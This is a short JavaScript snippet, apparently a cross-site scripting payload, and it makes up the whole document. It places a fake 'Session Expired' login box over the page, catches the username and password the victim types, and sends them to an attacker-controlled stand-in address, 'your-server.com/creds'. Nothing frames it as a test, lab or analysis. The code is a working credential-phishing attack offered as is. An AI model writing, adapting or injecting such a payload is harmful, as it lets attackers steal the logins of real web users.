let f=document.createElement('form');
f.innerHTML='<h3>Session Expired</h3><input name=u placeholder=Username><br><input name=p type=password placeholder=Password><br><button>Login</button>';
f.onsubmit=e=>{e.preventDefault();fetch("https://your-server.com/creds",{method:"POST",body:new FormData(f)})};
Object.assign(f.style,{position:'fixed',top:'30%',left:'30%',background:'#fff',padding:'2em',zIndex:9999});
document.body.appendChild(f);

